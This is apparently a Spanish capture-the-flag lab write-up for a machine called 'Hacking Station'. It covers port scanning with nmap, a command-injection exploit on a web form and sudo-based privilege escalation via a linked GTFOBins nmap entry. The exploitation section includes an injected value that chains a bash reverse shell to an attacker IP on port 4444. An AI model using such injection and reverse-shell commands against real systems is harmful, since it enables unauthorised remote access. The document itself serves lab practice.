---
description: '🔍 Dificultad: Muy Fácil'
---

# Hacking Station

🔍 **RECONOCIMIENTO**

En primer lugar, tras conectarnos a la máquina, utilizamos el comando:

```bash
ping -c 1 192.168.1.56
```

para verificar la conectividad de red.

<figure><img src="../../.gitbook/assets/image (1095).png" alt=""><figcaption></figcaption></figure>

A continuación, se realiza el comando:

```bash
nmap -p- --open 192.168.1.56 --min-rate 5000 -n
```

para realizar un escaneo de puertos y servicios detallado en la dirección IP.

<figure><img src="../../.gitbook/assets/image (1096).png" alt=""><figcaption></figcaption></figure>

Como podemos observar durante el escaneo el **puerto 80** perteneciente al **servicio HTTP** está abierto, por lo que a continuación se indagará más.

### 🔎 **EXPLORACIÓN**

Se utiliza el comando:

```bash
sudo nmap -sCV -p80 -v 192.168.1.56
```

para obtener más información sobre ese puerto específicamente.

<figure><img src="../../.gitbook/assets/image (1097).png" alt=""><figcaption></figcaption></figure>

Revisamos puerto 80.

<figure><img src="../../.gitbook/assets/image (1098).png" alt=""><figcaption></figcaption></figure>

### 🚀 **EXPLOTACIÓN**

Consiste en un Command Injection por lo que nos mandaremos una Reverse Shell.

```bash
hola;bash -c 'bash -i >& /dev/tcp/192.168.1.65/4444 0>&1'
```

Nos ponemos en escucha.

<figure><img src="../../.gitbook/assets/image (1099).png" alt=""><figcaption></figcaption></figure>

Hacemos el [tratamiento de la TTY](https://invertebr4do.github.io/tratamiento-de-tty/) para trabajar más cómodos.

### 🔐 PRIVILEGIOS

Al estar dentro y ejecutar:

```bash
whoami
```

aún no somos **root**, por lo que hacemos:

```bash
sudo -l
```

para ver si hay algo para explotar.

<figure><img src="../../.gitbook/assets/image (1100).png" alt=""><figcaption></figcaption></figure>

{% embed url="https://gtfobins.github.io/gtfobins/nmap/#sudo" %}

<figure><img src="../../.gitbook/assets/image (1101).png" alt=""><figcaption></figcaption></figure>
